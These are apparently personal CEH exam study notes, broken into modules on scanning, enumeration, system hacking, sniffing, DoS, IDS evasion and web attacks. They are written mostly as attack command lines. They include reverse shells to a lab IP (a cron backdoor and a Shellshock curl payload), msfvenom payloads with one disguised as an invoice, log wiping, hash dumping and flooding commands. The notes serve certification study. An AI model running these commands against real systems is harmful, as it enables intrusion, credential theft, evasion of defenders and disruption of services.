
## Table of Contents
^top
- [[CEH Walkthrough#^mod03 | Module 03: Scanning Networks]]
- [[CEH Walkthrough#^mod04 | Module 04 Enumeration]]
- [[CEH Walkthrough#^mod05 | Module 05 Vulnerability Analysis]]
- [[CEH Walkthrough#^mod06 | Module 06 System Hacking]]
- [[CEH Walkthrough#^mod07 | Module 07 Malware Threats]]
- [[CEH Walkthrough#^mod08 | Module 08 Sniffing]]
- [[CEH Walkthrough#^mod09 | Module 09 Social Engineering]]
- [[CEH Walkthrough#^mod10 | Module 10 Denial-of-Service]]
- [[CEH Walkthrough#^mod11 | Module 11 Session Hijacking]]
- [[CEH Walkthrough#^mod12 | Module 12 Evading IDS/IPS]]
- [[CEH Walkthrough#^mod13 | Module 13 Hacking Web Servers]]
- [[CEH Walkthrough#^mod14 | Module 14 Hacking Web Applications]]
- [[CEH Walkthrough#^mod15 | Module 15 SQL Injection]]
- [[CEH Walkthrough#^mod16 | Module 16 Hacking Wireless Networks]]
- [[CEH Walkthrough#^mod17 | Module 17 Hacking Mobile Platforms]]
- [[CEH Walkthrough#^mod18 | Module 18 IoT and OT Hacking]]
- [[CEH Walkthrough#^mod20 | Module 20 Cryptography (CEH Exam Focused)]]
- [[CEH Walkthrough#^apdx | Appendix Tools Cheatsheet]]


---

## Module 03: Scanning Networks
^mod03

### Host Discovery (Exam Weight: 30%)

 ARP Ping Scan (LAN)
```
nmap -sn -PR 192.168.1.0/24 -oN arp_scan.txt```
```

 ARP Ping Scan (WAN)
```
nmap -sn -PE -PM -PP 10.10.10.10  # Echo, Mask, Timestamp
```

Zombie Scan (Stealth)
```
nmap -sI zombie_ip target_ip -Pn
```
### Port Scanning Techniques (Exam MUST KNOW)
```
# TCP Connect Scan (-sT)
nmap -sT -p 1-1024 -v 10.10.10.10

# Stealth SYN Scan (-sS)
nmap -sS -T4 --top-ports 100 10.10.10.10

# UDP Scan (-sU)
nmap -sU -p 53,67,68,161,162 10.10.10.10
```
### Service/OS Detection (Exam Labs)
```
# Aggressive Detection (-A)
nmap -A -p 22,80,443 10.10.10.10

# OS Fingerprinting (-O)
nmap -O --osscan-limit 10.10.10.10

# NSE Scripts (Critical for Exam)
nmap --script=http-title,http-headers 10.10.10.10
```
### Firewall Evasion (Exam Tricks)
```
# Fragmentation (-f)
nmap -f -D RND:5 10.10.10.10  # Decoy scan

# Timing Manipulation (-T)
nmap -T0 10.10.10.10  # Paranoid (5+ min)
nmap -T5 10.10.10.10  # Insane (<30 sec)

# Source Port Manipulation
nmap --source-port 53 10.10.10.10  # Bypass firewall rules
```
### Output Formats (Exam Reports)
```
nmap -oN normal_output.txt  # Normal
nmap -oX xml_output.xml     # XML
nmap -oG grep_output.txt    # Grepable
```
### Hping3 (Advanced Scanning)
```
# TCP ACK Scan
hping3 -A 10.10.10.10 -p 80 -c 3

# UDP Flood Detection
hping3 -2 -p 53 --flood 10.10.10.10
```
### Exam-Critical Reference Table

|Scan Type|Command|Use Case|Detection Level|
|---|---|---|---|
|SYN Stealth|`nmap -sS`|Default scan|Medium|
|TCP Connect|`nmap -sT`|Reliable results|High|
|NULL Scan|`nmap -sN`|Firewall testing|Low|
|XMAS Scan|`nmap -sX`|Obscure systems|High|
|ACK Scan|`nmap -sA`|Firewall mapping|Medium|

### Practical Exam Checklist

1. Discover all live hosts in /24 network
    
2. Identify open ports on target (TCP/UDP)
    
3. Determine service versions
    
4. Evade firewall with fragmentation
    
5. Generate XML report for documentation
    

### Pro Tips:

- **Host Discovery First**: Always run `-sn` before port scans
    
- **Top Ports**: `--top-ports 100` saves time in exams
    
- **Verbose Mode**: Use `-v` or `-vv` for troubleshooting
    
- **NSE Scripts**: Memorize these for exam:
    
    - `http-enum` - Web directory brute-forcing
        
    - `smb-os-discovery` - Windows/SMB info
        
    - `ssl-enum-ciphers` - SSL/TLS testing

### Run these until automatic:
nmap -sn -PR 192.168.1.0/24
nmap -sS -T4 -p- -v 10.10.10.10
nmap -A --script=http-enum 10.10.10.10

[[CEH Walkthrough#^top|Back to top]]
___
## Module 04: Enumeration
^mod04

### NetBIOS/SMB Enumeration (Exam Weight: 30%)
```
# Nmap SMB Scripts
nmap -p 445 --script=smb-enum-shares,smb-enum-users 10.10.10.10

# Enum4linux (All-in-One)
enum4linux -a 10.10.10.10 | tee enum4linux.log

# Manual SMBClient
smbclient -L //10.10.10.10 -N  # Null session
smbclient //10.10.10.10/share -U 'username%password'
```
### SNMP Enumeration (Guaranteed Exam Task)
```
# SNMP Walk (v1)
snmpwalk -c public -v1 10.10.10.10

# Windows Specific
snmpwalk -c public -v1 10.10.10.10 1.3.6.1.4.1.77.1.2.25  # User accounts
snmpwalk -c public -v1 10.10.10.10 1.3.6.1.2.1.25.4.2.1.2  # Running processes

# Nmap SNMP Scripts
nmap -sU -p 161 --script=snmp-sysdescr,snmp-interfaces 10.10.10.10
```
### LDAP Enumeration
```
# Nmap LDAP Scripts
nmap -p 389 --script=ldap-rootdse,ldap-search 10.10.10.10

# Manual LDAP Search
ldapsearch -x -h 10.10.10.10 -b "dc=example,dc=com" "(objectClass=user)"
```
### DNS Enumeration
```
# Zone Transfer Test
dig axfr @10.10.10.10 example.com

# Nmap DNS Scripts
nmap -p 53 --script=dns-zone-transfer,dns-srv-enum 10.10.10.10

# DNSRecon
dnsrecon -d example.com -t axfr,std
```
###  Exam-Critical Reference Table

| Service | Tool       | Command Example          | Key Flags/Notes               |
| ------- | ---------- | ------------------------ | ----------------------------- |
| SMB     | enum4linux | `-a` for all checks      | Always try null session first |
| SNMP    | snmpwalk   | `-c public -v1`          | Check MIB 1.3.6.1.2.1.25.*    |
| LDAP    | ldapsearch | `-x` for simple auth     | Base DN required              |
| DNS     | dig        | `axfr` for zone transfer | Test all NS servers           |

### Practical Exam Checklist

1. Perform SMB null session enumeration
    
2. Enumerate SNMP public community string
    
3. Test DNS zone transfers
    
4. Extract LDAP directory information
    
5. Document all findings with screenshots
    

### Pro Tips:

- **Always check**: `rpcinfo -p 10.10.10.10` for RPC services
    
- **Critical ports**: 139/445 (SMB), 161 (SNMP), 389 (LDAP), 53 (DNS)
    
- **Exam trick**: Use `-Pn` with Nmap if host blocks ICMP
    
- **Must-know MIBs**:
    
    - 1.3.6.1.2.1.25.1.6.0 (System processes)
        
    - 1.3.6.1.4.1.77.1.2.25 (User accounts)

### Real-World Exam Lab
```
# Task: Enumerate Windows Server
1. nmap -p 445 --script=smb-os-discovery 10.10.10.10
2. enum4linux -a 10.10.10.10 | tee windows_enum.txt
3. snmpwalk -c public -v1 10.10.10.10 1.3.6.1.4.1.77.1.2.25
4. dig axfr @10.10.10.10 internal.domain
```

# Run these until automatic:
enum4linux -a 10.10.10.10
snmpwalk -c public -v1 10.10.10.10
nmap -p 445 --script=smb-enum-shares 10.10.10.10
dig axfr @10.10.10.10 example.com

[[CEH Walkthrough#^top|Back to top]]
___
## Module 05: Vulnerability Analysis
^mod05

### Vulnerability Scanning Tools (Exam Weight: 40%)
```
# OpenVAS (Greenbone) Setup
gvm-setup  # Initial configuration
gvm-start  # Launch services
gsad --http-only --listen=127.0.0.1 -p 9392  # Web interface

# Nessus Essentials (Exam Alternative)
/etc/init.d/nessusd start  # Start service
# Access https://localhost:8834
```
###  Web Vulnerability Scanning (Guaranteed Exam Task)
```
# Nikto Comprehensive Scan
nikto -h http://10.10.10.10 -Tuning x5678 -o nikto_scan.html -Format htm

# Nmap Vuln Scripts
nmap -p 80,443 --script=vuln 10.10.10.10 -oN web_vulns.txt
```
### Network Vulnerability Scanning
```
# Nmap Vulnerability Scan
nmap -p 1-1000 --script=vuln 10.10.10.10 -oA full_vuln_scan

# Cisco Specific Vulns
nmap -p 23 --script=cisco-* 10.10.10.10
```
### Credential Vulnerability Testing
```
# Hydra SSH Brute Force
hydra -L users.txt -P passwords.txt ssh://10.10.10.10 -t 4 -vV -o ssh_creds.txt

# Default Credential Checks
nmap -p 80 --script=http-default-accounts 10.10.10.10
```
### Exam-Critical Reference Table

| Tool      | Command Example                                                      | Key Flags           | Output Analysis Tips    |
| --------- | -------------------------------------------------------------------- | ------------------- | ----------------------- |
| Nikto     | `-Tuning x5678`                                                      | x=File, 5=Injection | Check for "OSVDB" IDs   |
| OpenVAS   | `omp -u admin -w pass -X '<create_target><name>...</create_target>'` | XML formatted       | Look for CVSS >7.0      |
| Nmap Vuln | `--script=vuln`                                                      | Combine with `-p-`  | "VULNERABLE" tags       |
| Hydra     | `-vV` for verbose                                                    | `-t 4` for threads  | "login:password" format |

### Practical Exam Checklist

1. Perform full OpenVAS/Nessus scan
    
2. Run Nikto against web servers
    
3. Test default credentials on services
    
4. Verify vulnerability findings manually
    
5. Generate professional report
    

### Pro Tips:

- **Always check**: `/server-status` on Apache servers
    
- **Critical plugins**: Enable "Dangerous" plugins in OpenVAS
    
- **Exam trick**: Use `-T4` with Nmap for faster scans
    
- **Must-know CVEs**: Heartbleed, Shellshock, EternalBlue

### Real-World Exam Lab
```
# Task: Assess Windows/Web Server
1. gvm-cli socket --gmp-username admin --gmp-password pass --xml "<get_tasks/>"
2. nikto -h http://10.10.10.10 -Tuning 4 -o web_scan.txt
3. nmap -p 445 --script=smb-vuln-* 10.10.10.10
4. hydra -L users.txt -P passwords.txt http-form-post "/login.php:user=^USER^&pass=^PASS^:F=incorrect" -vV
```

# Run these until automatic:
nikto -h http://10.10.10.10 -Tuning 4
nmap -p 80,443 --script=vuln 10.10.10.10
hydra -L users.txt -P passwords.txt ssh://10.10.10.10
gvm-cli socket --xml "<get_version/>"

[[CEH Walkthrough#^top|Back to top]]
___
## Module 06: System Hacking
^mod06

### 1. Password Cracking (Exam Weight: 30%)
```
# Windows Hash Extraction
meterpreter > hashdump
meterpreter > run post/windows/gather/smart_hashdump

# John the Ripper (NTLM)
john --format=NT hashes.txt --wordlist=/usr/share/wordlists/rockyou.txt

# Hashcat (GPU Accelerated)
hashcat -m 1000 ntlm_hashes.txt /usr/share/wordlists/rockyou.txt --force
```
### Privilege Escalation (Guaranteed Exam Task)
```
# Windows (Meterpreter)
meterpreter > getsystem
meterpreter > run post/multi/recon/local_exploit_suggester

# Linux (Manual)
find / -perm -4000 2>/dev/null  # SUID Binaries
sudo -l  # Check sudo permissions
```
### Maintaining Access
```
# Metasploit Persistence
meterpreter > run persistence -X -i 60 -p 4444 -r 10.10.10.10

# Cron Job Backdoor
echo "* * * * * /bin/bash -c 'bash -i >& /dev/tcp/10.10.10.10/4444 0>&1'" > cronjob
```
### Post-Exploitation Framework
```
# Windows (Mimikatz)
mimikatz # privilege::debug
mimikatz # sekurlsa::pth /user:Admin /domain:TEST /ntlm:NTLM_HASH
./LinEnum.sh -t -r report.html`
```
### Clearing Tracks
```
# Windows Event Log Manipulation
meterpreter > clearev
meterpreter > run event_manager -i

# Linux Log Cleaning
shred -zu /var/log/auth.log

# Linux Log Cleaning
shred -zu /var/log/auth.log
```

### Exam-Critical Reference Table

| Technique         | Tool       | Command Example            | Key Flags           |
| ----------------- | ---------- | -------------------------- | ------------------- |
| Hash Extraction   | mimikatz   | `sekurlsa::logonpasswords` | Requires admin      |
| Password Cracking | hashcat    | `-m 1000` for NTLM         | `--force` for GPU   |
| Privilege Escal   | linpeas.sh | `./linpeas.sh`             | Look for yellow/red |
| Persistence       | metasploit | `run persistence -X`       | `-i` for interval   |

### Practical Exam Checklist

1. Extract password hashes
    
2. Crack at least one admin hash
    
3. Escalate privileges
    
4. Establish persistence
    
5. Clear event logs
    

### Pro Tips:

- **Always check**: `sudo -l` on Linux targets
    
- **Critical files**: `/etc/passwd`, `/etc/shadow`, SAM database
    
- **Exam trick**: Use `--show` in John to view cracked passwords
    
- **Must-know exploits**: Dirty Cow, CVE-2021-4034 (PwnKit)

### Real-World Exam Lab
```
# Task: Compromise Windows Target
1. msfvenom -p windows/meterpreter/reverse_tcp LHOST=10.10.10.10 LPORT=4444 -f exe > payload.exe
2. msfconsole -q -x "use exploit/multi/handler; set payload windows/meterpreter/reverse_tcp; set LHOST 10.10.10.10; run"
3. meterpreter > hashdump
4. john --format=NT hashes.txt --wordlist=rockyou.txt
5. meterpreter > getsystem
```
# Run these until automatic:
john --format=NT hashes.txt --wordlist=rockyou.txt
hashcat -m 1000 ntlm_hashes.txt rockyou.txt --force
meterpreter > getsystem
./linpeas.sh -t

[[CEH Walkthrough#^top|Back to top]]
___
## Module 07: Malware Threats
^mod07

### 1. Trojan Analysis (Exam Weight: 25%)
```
# Static Analysis
strings malware.exe | grep -i -E "password|http|key"  # Extract cleartext artifacts
peframe malware.exe  # PE file analysis

# Dynamic Analysis (Sandbox)
cuckoo submit malware.exe  # Automated sandbox
wireshark -k -i any  # Monitor network traffic
```
### RAT Detection (Guaranteed Exam Task)
```
# Network Indicators
netstat -ano | findstr "ESTABLISHED"  # Windows
ss -tulnp | grep -v "127.0.0.1"       # Linux

# Process Analysis
tasklist /svc /fi "STATUS eq running"  # Windows
ps aux | grep -i -E "njrat|darkcomet"  # Linux
```
###  Virus Detection Tools
```
# YARA Rules
yara -r malware_rules.yar suspicious_file.exe

# PE Analysis
diec malware.exe  # Detect It Easy
pecheck -a malware.exe  # Full PE inspection
```
### Malware Persistence Mechanisms
```
# Windows Autostart Locations
reg query "HKCU\Software\Microsoft\Windows\CurrentVersion\Run"
dir "%APPDATA%\Microsoft\Windows\Start Menu\Programs\Startup"

# Linux Cron Jobs
crontab -l
ls -la /etc/cron* /var/spool/cron/crontabs
```
### Malware Reverse Engineering
```
# Basic Disassembly
objdump -d malware.exe -M intel > disassembly.asm

# Behavioral Analysis
strace -f -o trace.log ./malware
```

### Exam-Critical Reference Table

| Technique        | Tool    | Command Example                      | Key Indicators              |
| ---------------- | ------- | ------------------------------------ | --------------------------- |
| Static Analysis  | strings | `strings -el malware.exe`            | URLs, IPs, passwords        |
| Dynamic Analysis | Procmon | Filter: "Process Name = malware.exe" | Registry writes, file drops |
| RAT Detection    | Netstat | `netstat -ano`                       | Unusual ports (5555, 9876)  |
| YARA Scanning    | yara    | `yara -s rules.yar file.exe`         | Rule matches                |

### Practical Exam Checklist

1. Perform static analysis on provided malware
    
2. Identify persistence mechanisms
    
3. Detect network callbacks
    
4. Analyze packed/obfuscated code
    
5. Document findings with screenshots
    

### Pro Tips:

- **Always check**: `%TEMP%` directory for dropped files
    
- **Critical ports**: 5555 (njRAT), 5110 (ProRAT), 9876 (Theef)
    
- **Exam trick**: Use `binwalk -e` for embedded malware components
    
- **Must-know tools**: PEiD, Detect It Easy, Process Hacker

### Real-World Exam Lab
```
# Task: Analyze suspicious.exe
1. strings suspicious.exe > strings.txt
2. diec suspicious.exe
3. pecheck -a suspicious.exe
4. netstat -ano | findstr "ESTABLISHED"
5. reg query "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run"
```
# Run these until automatic:
strings malware.exe | grep -i "http"
netstat -ano | findstr "5555"
diec suspicious_file.exe
yara -r rules.yar malware_sample

[[CEH Walkthrough#^top|Back to top]]
___
## Module 08: Sniffing
^mod08

### Passive Sniffing Techniques (Exam Weight: 30%)
```
# TCPDump Basics
tcpdump -i eth0 -nn -vv -c 100 'port 80' -w capture.pcap

# Monitor HTTP Traffic
tcpdump -i eth0 -A -s0 'tcp port 80 and (((ip[2:2] - ((ip[0]&0xf)<<2)) - ((tcp[12]&0xf0)>>2)) != 0'

# Capture FTP Credentials
tcpdump -i eth0 -nn -v port 21 | grep -i 'USER\|PASS'
```
### Active Sniffing (MITM Attacks)
```
# ARP Poisoning
arpspoof -i eth0 -t 192.168.1.100 192.168.1.1
ettercap -T -q -i eth0 -M arp:remote /192.168.1.100// /192.168.1.1//

# SSLStrip Attack
sslstrip -a -f -k
iptables -t nat -A PREROUTING -p tcp --destination-port 80 -j REDIRECT --to-port 8080
```
### Wireshark Filters (Exam MUST KNOW)
```
# Find Cleartext Passwords
http.request.method == "POST" && http.file_data contains "password"

# Detect ARP Spoofing
arp.duplicate-address-frame

# VoIP Calls
udp.port == 5060 || udp.port == 10000-20000
```
### Protocol Analysis
```
# DNS Query Monitoring
tcpdump -i eth0 -nn 'udp port 53'

# SMTP Email Capture
tcpdump -i eth0 -nn -X -s0 'tcp port 25' | grep -i 'AUTH PLAIN\|MAIL FROM\|RCPT TO'
```
### Advanced Sniffing
```
# Decrypt SSL Traffic (When Private Key Available)
wireshark -o "ssl.desegment_ssl_records: TRUE" -o "ssl.desegment_ssl_application_data: TRUE" -o "ssl.keys_list: 10.10.10.10,443,http,key.pem" capture.pcap

# Extract Files from PCAP
tshark -r capture.pcap --export-objects "http,./exported_files"
```

### Exam-Critical Reference Table

| Technique        | Tool      | Command Example    | Key Filters           |     |     |
| ---------------- | --------- | ------------------ | --------------------- | --- | --- |
| Passive Sniffing | tcpdump   | `-nn -vv -c 100`   | 'port 80'             |     |     |
| ARP Spoofing     | ettercap  | `-T -q -M arp`     | arp.duplicate-address |     |     |
| SSL Stripping    | sslstrip  | `-a -f -k`         | http contains "login" |     |     |
| VoIP Capture     | wireshark | `udp.port == 5060` | sip                   |     | rtp |

### Practical Exam Checklist

1. Capture FTP/HTTP credentials
    
2. Perform ARP poisoning attack
    
3. Decrypt SSL traffic (when possible)
    
4. Analyze captured VoIP calls
    
5. Document findings with screenshots
    

### Pro Tips:

- **Always check**: `arp -a` for MAC address conflicts
    
- **Critical ports**: 21 (FTP), 25 (SMTP), 80 (HTTP), 5060 (SIP)
    
- **Exam trick**: Use `-s0` in tcpdump for full packet capture
    
- **Must-know filters**: `tcp.analysis.flags`, `http.cookie`

### Real-World Exam Lab
```
# Task: Capture Web Login Credentials
1. arpspoof -i eth0 -t 192.168.1.100 192.168.1.1
2. tcpdump -i eth0 -w login.pcap 'tcp port 80 and (tcp[((tcp[12:1] & 0xf0) >> 2):4] = 0x504f5354)'
3. wireshark login.pcap
4. Filter: http.request.method == "POST" && http contains "password"
```
# Run these until automatic:
tcpdump -i eth0 -nn -vv 'port 80'
arpspoof -i eth0 -t victim_ip gateway_ip
wireshark -Y "http.request.method == POST"
ettercap -T -q -i eth0 -M arp

[[CEH Walkthrough#^top|Back to top]]
___
## Module 09: Social Engineering
^mod09

```
# SET Toolkit
setoolkit
# Select: 
1) Social-Engineering
2) Website Attack Vectors
3) Credential Harvester


# Spear Phishing
msfvenom -p windows/meterpreter/reverse_tcp LHOST=YOUR_IP -f exe > invoice.exe
```

[[CEH Walkthrough#^top|Back to top]]
___
## Module 10: Denial-of-Service
^mod10

### Network Layer DoS Attacks (Exam Weight: 40%)
```
# SYN Flood Attack
hping3 -S -p 80 --flood -a 192.168.1.100 10.10.10.10

# UDP Flood (DNS Amplification)
hping3 -2 -p 53 --flood --rand-source --data 1000 10.10.10.10

# ICMP Flood (Ping of Death)
ping -f -l 65500 10.10.10.10
```
### Application Layer DoS (Guaranteed Exam Task)
```
# Slowloris Attack
slowhttptest -c 1000 -H -i 10 -r 200 -t GET -u http://10.10.10.10 -x 24 -p 3

# HTTP Flood
goldeneye http://10.10.10.10 -m get -s 500 -w 100
```
### Wireless DoS (Exam Favorite)
```
# Deauthentication Attack
aireplay-ng --deauth 1000 -a AP:MAC wlan0mon

# Beacon Flood
mdk4 wlan0mon b -n "FakeAP" -c 6 -s 1000
```
### Detection & Prevention
```
# Monitor SYN Floods
netstat -n -p tcp | grep SYN_RECV | wc -l

# Check ICMP Rate
tcpdump -nni eth0 'icmp[icmptype] = icmp-echo' -c 100 | awk '{print $3}' | sort | uniq -c
```
### Exam-Critical Reference Table

| Attack Type       | Tool         | Command Example              | Key Flags        |
| ----------------- | ------------ | ---------------------------- | ---------------- |
| SYN Flood         | hping3       | `-S --flood -a spoofed_ip`   | Random source IP |
| HTTP Slow         | slowhttptest | `-c connections -i interval` | `-H` for Hold    |
| Wireless DoS      | mdk4         | `b -n "FakeAP" -s 1000`      | Channel hopping  |
| DNS Amplification | hping3       | `-2 -p 53 --data 1000`       | UDP protocol     |

### Practical Exam Checklist

1. Launch SYN flood against target
    
2. Perform HTTP slowloris attack
    
3. Execute wireless deauthentication
    
4. Monitor attack effectiveness
    
5. Document all traffic patterns
    

### Pro Tips:

- **Always check**: `ulimit -n` for file descriptor limits
    
- **Critical ports**: 53 (DNS), 80 (HTTP), 443 (HTTPS)
    
- **Exam trick**: Use `--rand-source` in hping3 for evasion
    
- **Must-know tools**: LOIC, HOIC (GUI alternatives)
    

### Real-World Exam Lab
```
# Task: Test DoS Protection
1. hping3 -S -p 80 --flood -a random 10.10.10.10
2. slowhttptest -c 500 -H -u http://10.10.10.10
3. aireplay-ng --deauth 100 -a AP:MAC wlan0mon
4. tcpdump -i eth0 -nn 'icmp' -c 1000 > icmp_flood.pcap
```
# Run these until automatic:
hping3 -S -p 80 --flood 10.10.10.10
slowhttptest -c 1000 -H -u http://10.10.10.10
aireplay-ng --deauth 100 -a AP:MAC wlan0mon
netstat -n -p tcp | grep SYN_RECV

[[CEH Walkthrough#^top|Back to top]]
___
## Module 11: Session Hijacking
^mod11

### TCP Session Hijacking (Exam Weight: 25%)

### Sequence Number Prediction (Manual)
```
hping3 -S -p 80 -s 54321 --tcp-timestamp -a 10.10.10.10 --keep -c 3 -L 12345 -M 12346 -N 12347 -w 64
```
## Hunt for Session IDs
```
tcpdump -i eth0 'tcp[13] & 2 != 0' -vv  # Capture SYN-ACK packets
```
###  ARP Spoofing (Guaranteed Exam Task)
```
# Enable IP Forwarding
echo 1 > /proc/sys/net/ipv4/ip_forward

# ARP Poisoning
arpspoof -i eth0 -t 192.168.1.100 -r 192.168.1.1
ettercap -T -q -i eth0 -M arp:remote /192.168.1.100// /192.168.1.1//
```
### Cookie Hijacking (Web Apps)
```
# Live Browser Cookie Theft
document.cookie  # Run in browser console

# Cookie Monster Attack
sqlmap -u "http://test.com" --cookie="PHPSESSID=abcd" --eval="document.cookie"
```
### MITM Tools (Exam Essentials)
```
# Wireshark Filters
http.cookie contains "sessionid"
tcp.analysis.retransmission  # Detect hijacking attempts

# Bettercap MITM
bettercap -iface eth0
> net.probe on
> net.sniff on
> set arp.spoof.targets 192.168.1.100
> arp.spoof on
```
### Session Fixation (Web Security)
```
# Force Session ID
curl -v -c cookies.txt http://test.com/login.php?SESSID=HACKED
```

###  Exam-Critical Reference Table

| Attack Type   | Tool       | Command Example                      | Detection Method    |
| ------------- | ---------- | ------------------------------------ | ------------------- |
| ARP Spoofing  | arpspoof   | `arpspoof -i eth0 -t victim gateway` | ARP watch           |
| TCP Hijacking | hping3     | `hping3 -S -p 80 --flood`            | SEQ number analysis |
| Cookie Theft  | Burp Suite | Intercept "Set-Cookie" header        | HTTPS enforcement   |
| DNS Spoofing  | ettercap   | `ettercap -T -q -i eth0 -M dns`      | DNSSEC validation   |

### Practical Exam Checklist

1. Perform ARP cache poisoning between two hosts
    
2. Capture and reuse a session cookie
    
3. Detect ongoing session hijacking attempts
    
4. Demonstrate TCP sequence prediction
    
5. Document all findings in report
    

### Pro Tips:

- **Always check**: `arp -a` for duplicate MAC addresses
    
- **Critical ports**: 21 (FTP), 23 (Telnet), 80 (HTTP) are prime targets
    
- **HTTPS bypass**: Use `sslstrip` for downgrade attacks
    
- **Exam trick**: Look for `tcp[13] & 18 = 18` filters in Wireshark (ACK+RST)


# Run these until automatic:
arpspoof -i eth0 -t victim_ip router_ip
ettercap -T -q -i eth0 -M arp /victim_ip// /router_ip//
tcpdump -i eth0 'tcp[13] & 2 != 0' -vv

[[CEH Walkthrough#^top|Back to top]]
___
## Module 12: Evading IDS/IPS
^mod12

## Nmap Fragmentation
```
Packet Fragmentation (-f)
nmap -f -D RND:5 10.10.10.10  # Fragment packets + 5 decoys

# Timing Manipulation (-T)
nmap -T0 10.10.10.10  # Paranoid (5+ min)
nmap -T5 10.10.10.10  # Insane (<30 sec)

# Source Port Spoofing
nmap --source-port 53 10.10.10.10  # Appear as DNS traffic
```
### Metasploit Evasion (Guaranteed Exam Task)
```
# Payload Encoding
msfvenom -p windows/meterpreter/reverse_tcp LHOST=10.10.10.10 LPORT=443 -e x86/shikata_ga_nai -f exe > payload.exe

# Obfuscated Web Delivery
use exploit/multi/script/web_delivery
set target 2  # PowerShell
set payload windows/meterpreter/reverse_https
set LHOST 10.10.10.10
exploit
```
### Protocol-Level Evasion
```
# HTTP/S Traffic Obfuscation
cryptcat -k "CEH2023" -l -p 4444  # Encrypted tunnel
socat TCP4-LISTEN:443,fork,reuseaddr TCP4:10.10.10.10:80  # Port redirection

# ICMP Covert Channel
ptunnel -p 10.10.10.10 -lp 1080 -da 192.168.1.100 -dp 22  # SSH over ICMP
```
### IDS Signature Evasion
```
# Snort Rule Evasion
curl http://10.10.10.10 --data "var=SELECT/*random_text*/password/*more_text*/FROM users"  # SQLi obfuscation

# Unicode Evasion
ncat -lvp 4444 -e /bin/bash --allow 10.10.10.10 --ssl  # SSL-wrapped shell
```
###  Real-World Exam Lab
```
# Task: Evade detection while scanning Windows target
nmap -sS -T2 -f --data-length 24 --ttl 64 --spoof-mac Cisco 10.10.10.10 -p 80,443,445 -oN stealth_scan.txt

# Expected Output: 
# "Host appears to be up" without triggering alerts
```
# Run these until automatic:
nmap -f -D RND:3 -T2 --source-port 53 10.10.10.10
msfvenom -p windows/meterpreter/reverse_tcp -e x86/shikata_ga_nai -f exe
ptunnel -p 10.10.10.10 -lp 1080 -da 192.168.1.100 -dp 22

### Exam-Critical Reference Table

| Technique            | Tool     | Command Example          | Detection Bypass                 |
| -------------------- | -------- | ------------------------ | -------------------------------- |
| Packet Fragmentation | Nmap     | `nmap -f --mtu 24`       | Defeats simple packet inspection |
| Payload Encoding     | MSFVenom | `-e x86/shikata_ga_nai`  | Anti-virus evasion               |
| Protocol Tunneling   | Ptunnel  | `ptunnel -p attacker_ip` | ICMP whitelisting                |
| Time Delay           | Nmap     | `--scan-delay 5s`        | Throttle-based detection         |

### Practical Exam Checklist

1. Perform fragmented scan against target
    
2. Generate encoded payload with MSFVenom
    
3. Set up ICMP covert channel
    
4. Bypass simple Snort rule with obfuscation
    
5. Document all evasion techniques used
    

### Pro Tips:

- **Always combine techniques**: `nmap -f -T2 -D RND:3 --source-port 53`
    
- **Critical ports to spoof**: 53 (DNS), 80 (HTTP), 443 (HTTPS)
    
- **Exam trick**: Use `--badsum` to test IDS robustness
    
- **Must-know encoders**: `shikata_ga_nai`, `call4_dword_xor`

[[CEH Walkthrough#^top|Back to top]]
___
## Module 13: Hacking Web Servers
^mod13

### 1. Web Server Fingerprinting (Exam Weight: 20%)

## Banner Grabbing
```
nc -nv 10.10.10.10 80
HEAD / HTTP/1.0
```
## Automated Fingerprinting
```
whatweb http://10.10.10.10
nmap --script=http-server-header.nse 10.10.10.10 -p 80,443
```

### Vulnerability Scanning (Guaranteed Exam Task)
```
# Nikto Deep Scan
nikto -h http://10.10.10.10 -Tuning xb -o nikto_scan.txt

# Nmap Web Vuln Scan
nmap --script=http-vuln* 10.10.10.10 -p 80,443
```

### FTP Server Attacks (Exam Favorite)
```
# Brute Force with Hydra
hydra -L users.txt -P passwords.txt ftp://10.10.10.10 -t 4 -vV

# Anonymous Login Check
ftp 10.10.10.10
Username: anonymous
Password: anonymous@
```
### Web Server Exploitation
```
# Shellshock Exploit
curl -H "User-Agent: () { :; }; /bin/bash -i >& /dev/tcp/10.10.10.10/4444 0>&1" http://vulnerable-site.com/cgi-bin/test.cgi

# Heartbleed Test
nmap -p 443 --script=ssl-heartbleed 10.10.10.10
```
### Web Server Misconfigurations
```
# Directory Traversal
curl http://10.10.10.10/../../../../etc/passwd

# HTTP Methods Enumeration
nmap --script=http-methods 10.10.10.10
```

### Exam-Critical Reference Table

| Attack Type     | Tool   | Command Example                        | Detection Method        |
| --------------- | ------ | -------------------------------------- | ----------------------- |
| Banner Grabbing | Netcat | `nc -nv 10.10.10.10 80`                | Server header analysis  |
| FTP Brute Force | Hydra  | `hydra -L users.txt ftp://10.10.10.10` | Failed login monitoring |
| Shellshock      | cURL   | `curl -H "malicious-header"`           | CGI script auditing     |
| Heartbleed      | Nmap   | `nmap --script=ssl-heartbleed`         | OpenSSL patching        |

### Practical Exam Checklist

1. Identify web server version and technologies
    
2. Check for anonymous FTP access
    
3. Perform directory traversal test
    
4. Exploit at least one vulnerability
    
5. Document all findings in report
    

### Pro Tips:

- **Always check**: `/robots.txt` for hidden directories
    
- **Critical files**: `/etc/passwd`, `web.config`, `.htaccess`
    
- **Exam trick**: Use `-Tuning xb` in Nikto for quick results
    
- **Must-know ports**: 80 (HTTP), 443 (HTTPS), 21 (FTP), 22 (SSH)


### Real-World Exam Lab
```
# Task: Compromise vulnerable web server
1. whatweb http://10.10.10.10
2. nikto -h http://10.10.10.10
3. hydra -L users.txt -P passwords.txt http-get://10.10.10.10/admin
4. curl http://10.10.10.10/vulnerable.php?cmd=id
```
# Run these until automatic:
whatweb http://10.10.10.10
nikto -h http://10.10.10.10 -Tuning xbhydra -L users.txt -P passwords.txt ftp://10.10.10.10

[[CEH Walkthrough#^top|Back to top]]
___
## Module 14: Hacking Web Applications
^mod14

```
# SQL Injection (Manual)
' OR 1=1 -- -

# SQLmap Automation
sqlmap -u "http://test.com?id=1" --risk=3 --level=5 --dbs
```

[[CEH Walkthrough#^top|Back to top]]
___
## Module 15: SQL Injection
^mod15
### 1. Web App Reconnaissance (Exam Weight: 20%)
```
# Directory Bruteforcing

gobuster dir -u http://10.10.10.10 -w /usr/share/wordlists/dirb/common.txt -x php,html,txt -t 50

# Subdomain Enumeration

wfuzz -c -w /usr/share/wordlists/SecLists/Discovery/DNS/subdomains-top1million-5000.txt -H "Host: FUZZ.example.com" http://example.com
```
### Authentication Attacks (Guaranteed Exam Task)
```
# Form Brute Force with Hydra

